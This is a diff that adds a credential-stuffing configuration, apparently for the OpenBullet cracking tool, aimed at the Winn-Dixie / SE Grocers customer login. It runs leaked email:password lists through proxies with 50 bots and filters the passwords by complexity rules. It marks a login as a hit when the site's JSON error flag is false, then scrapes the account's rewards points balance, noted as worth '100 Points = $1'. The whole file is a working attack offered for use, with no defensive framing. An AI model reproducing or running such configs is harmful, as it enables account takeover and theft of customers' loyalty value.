@@ -1,0 +1,80 @@
+[SETTINGS]
+{
+  "Name": "SE Grocers",
+  "SuggestedBots": 50,
+  "LastModified": "2018-08-21T03:01:51.1665247+00:00",
+  "AdditionalInfo": "100 Points = $1",
+  "Author": "Mew",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [
+    {
+      "SliceName": "PASS",
+      "RuleType": 2,
+      "RuleString": "8",
+      "Id": 1954705617
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 3,
+      "RuleString": "16",
+      "Id": 248799937
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 0,
+      "RuleString": "Digit",
+      "Id": 1328609303
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 1,
+      "RuleString": "!@#$%",
+      "Id": 715613960
+    }
+  ],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://www.winndixie.com/register-now" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+REQUEST POST "https://www.winndixie.com/V2/SecurityComponents/BLHLoginJson?type=hard" AutoRedirect=TRUE 
+  CONTENT "EmaillAddress=<USER>&Password=<PASS>&recaptcha_response_field=manual_challenge&g-recaptcha-response=&IsFirstAttempt=True&PhoneNumber=&ZipCode=&fhController=SecurityComponentsController&fhAction=SEGLoginModal&redirectTo=myaccount" 
+  CONTENTTYPE "application/x-www-form-urlencoded, application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER ": authority: www.winndixie.com" 
+  HEADER ": method: POST" 
+  HEADER ": path: /V2/SecurityComponents/BLHLoginJson?type=hard" 
+  HEADER ": scheme: https" 
+  HEADER "origin: https://www.winndixie.com" 
+  HEADER "referer: https://www.winndixie.com/register-now" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "IsError\":false" 
+  KEYCHAIN Failure OR 
+    KEY "IsError\":true" 
+REQUEST GET "https://www.winndixie.com/rewards-logged-in" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "class=\"total-points col-md-12 col-sm-12 col-xs-12 p-0 text-center\">" "Points" Recursive=FALSE -> CAP "Points" "" "" 
